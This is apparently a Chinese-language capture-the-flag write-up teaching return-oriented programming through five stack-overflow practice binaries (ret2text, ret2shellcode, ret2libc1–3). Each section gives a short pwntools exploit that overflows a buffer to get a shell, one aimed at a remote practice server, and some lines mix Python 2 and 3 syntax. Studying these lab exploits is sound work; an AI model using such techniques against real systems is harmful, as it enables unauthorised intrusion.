ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。

ret2text

例子取自：ctfwiki中ret2text:https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text

查看保护机制发现，仅开启栈不可执行，是32位程序

拖进ida32位可以看到程序存在函数gets，不限制输入长度，可以进行栈溢出secure函数中看到调用了system("/bin/sh")，那么我们将程序返回到0x0804863A就可以获得程序的控制权，编写exp如下

  1. from pwn import*

  3. io = process('ret2text')
  4. sys_addr = 0x0804863A
  5. payload = 'A'* 0x6c+ 'BBBB'+ p32(sys_addr)
  6. io.sendline(payload)
  7. io.interactive()

ret2shellcode

例子取自于：ciscn2019n_5

查看程序保护，全都没开，并且存在读写执行的段

分析程序先read一部分内容放到bss的name中，然后使用存在gets函数。所以我们可以第一次发送shellcode写入到bss段，第二次用gets溢出跳转到shellcode，exp编写如下：

  1. from pwn import*
  2. context.arch = 'amd64'
  3. #io = process('./ciscn_2019_n_5')
  4. io = remote('node3.buuoj.cn', 25238)
  5. shellcode = 0x000000000601080
  6. io.recvline()
  7. payload1 = asm(shellcraft.sh())
  8. io.sendline(payload1)
  9. io.recvline()
  10. io.recvline()
  11. payload2 = 'a'* 0x20+ 'b'* 8+ p64(shellcode)
  12. io.sendline(payload2)
  13. io.interactive()

ret2libc1：

情况：有system_plt和"/bin/sh" 例子：https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1

查看程序保护，开了栈不可执行，32位程序

分析程序发现程序中有system函数，'/bin/sh'字符串和gets的溢出点，构造exp如下:

  1. from pwn import*

  3. io = process('./ret2libc1')
  4. bin_sh = 0x08048720
  5. sys_addr = 0x08048460
  6. payload = b'a'* 112+ p32(sys_addr) + b'bbbb'+ p32(bin_sh)
  7. io.sendline(payload)
  8. io.interactive()

ret2libc2:

例子：https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2

和例一基本相同，但是缺少"/bin/sh"字符串，可以用gadgets来自己写入"/bin/sh"

用ROPgadget看可以用的寄存器

这里可以用pop ebx ；ret，所以简单写下exp

  1. from pwn import*

  3. io = process('./ret2libc2')
  4. gets_plt = 0x08048460
  5. system_plt = 0x08048490
  6. pop_ebx = 0x0804843d
  7. buf2 = 0x804a080
  8. payload = b'a'* 112+ p32(gets_plt) + p32(pop_ebx) + p32(buf2) + p32(system_plt) + 'bbbb'+ p32(buf2)
  9. io.sendline(payload)
  10. io.interactive()

ret2libc3：

例子：https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3

在ret2libc2的基础上，system函数也没了。

查看查程序保护。开启了栈不可执行。

因为程序使用libc.so的动态链接库，库里面函数偏移值是固定的

我们可以通过got表泄露找到相对应的libc，但是由于libc的延迟绑定机制，我们要泄露已经执行过的函数，所以我们这里调用puts打印puts got表。exp的利用如下：

  1. from pwn import*
  2. fromLibcSearcherimport*
  3. context.log_level='debug'
  4. io = process('./ret2libc3')
  5. elf = ELF('./ret2libc3')
  6. puts_plt = elf.plt['puts']
  7. puts_got = elf.got['puts']
  8. main_addr = elf.symbols['main']

  10. io.recvuntil('!?')
  11. payload = 'a'* 112+ p32(puts_plt) + p32(main_addr) + p32(puts_got)
  12. io.sendline(payload)

  14. puts_addr = u32(io.recv(4))
  15. print hex(puts_addr)
  16. libc = LibcSearcher('puts', puts_addr)
  17. libcbase = puts_addr - libc.dump('puts')
  18. sys_addr = libcbase + libc.dump('system')
  19. binsh_addr = libcbase + libc.dump('str_bin_sh')

  21. io.recvuntil('?')
  22. payload2 = 'a'* (0x64+ 4) + p32(sys_addr) + 'bbbb'+ p32(binsh_addr)
  23. io.sendline(payload2)
  24. io.interactive()
